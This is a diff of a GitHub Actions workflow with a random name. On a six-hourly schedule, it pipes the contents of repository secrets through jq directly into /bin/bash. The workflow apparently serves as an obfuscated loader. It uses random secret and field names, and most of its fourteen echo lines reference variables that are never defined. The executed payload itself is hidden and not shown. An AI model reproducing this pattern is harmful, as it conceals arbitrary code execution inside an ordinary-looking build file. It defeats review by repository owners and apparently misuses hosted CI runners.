@@ -1,23 +1,30 @@
 name: defensivechinchillas
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '56 3/6 * * *'
-jobs:  # 24425
+    - cron: '9 1/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: defensivechinchillas
         env:
-          uzxr693: ${{ secrets.uzxr693 }}
+          vietr30: ${{ secrets.vietr30 }}
         run: |
-          echo $uzxr693 | jq -r .tsbgg763 | /bin/bash
-          echo $n73 | jq -r .toa45 | /bin/bash
-          echo $mv4513 | jq -r .eue38312 | /bin/bash
-          echo $up02359 | jq -r .l3916 | /bin/bash
-          echo $g93349 | jq -r .xhalm84176 | /bin/bash
-          echo $aw8192 | jq -r .hmn130 | /bin/bash
+          echo $vietr30 | jq -r .c7704 | /bin/bash
+          echo $rc673 | jq -r .vkw50676 | /bin/bash
+          echo $r42 | jq -r .jmwd068 | /bin/bash
+          echo $ado0594 | jq -r .tis3037 | /bin/bash
+          echo $slc9 | jq -r .ti1890 | /bin/bash
+          echo $v12928 | jq -r .iu246 | /bin/bash
+          echo $hn825 | jq -r .ozz082 | /bin/bash
+          echo $b49 | jq -r .dmukl06 | /bin/bash
+          echo $u5902 | jq -r .tx190 | /bin/bash
+          echo $aydyt63 | jq -r .ubvr7 | /bin/bash
+          echo $bm500 | jq -r .ez140 | /bin/bash
+          echo $fs6 | jq -r .pzbln68992 | /bin/bash
+          echo $zcg9032 | jq -r .fptw6685 | /bin/bash
+          echo $sst15 | jq -r .hst45 | /bin/bash
 
